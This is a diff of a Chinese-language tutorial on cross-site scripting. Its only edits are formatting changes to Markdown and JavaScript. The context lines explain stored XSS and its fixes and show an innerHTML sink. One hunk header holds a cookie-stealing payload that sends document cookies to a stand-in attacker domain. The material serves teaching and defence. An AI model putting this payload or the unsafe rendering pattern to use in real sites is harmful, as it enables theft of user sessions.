@@ -208,7 +208,7 @@ function serverRender(s) {
 3. 用户浏览器接收到响应后解析之行，混在其中的恶意代码也被执行
 4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作
 
-⚠️ **注意：**这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。
+⚠️ **注意**：这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。
 
 修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的编码转义。
 
@@ -234,7 +234,7 @@ function serverRender(s) {
 
   const root = document.querySelector('#root');
 
-  res.forEach(item => {
+  res.forEach((item) => {
     const p = document.createElement('p');
     p.innerHTML = item;
     root.append(p);
@@ -498,7 +498,7 @@ new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + docume
 const Koa = require('koa');
 const app = new Koa();
 
-app.use(async ctx => {
+app.use(async (ctx) => {
   if (ctx.url === '/index') {
     ctx.cookie.set('cid', 'hello world', {
       // 写 Cookie 所在域名
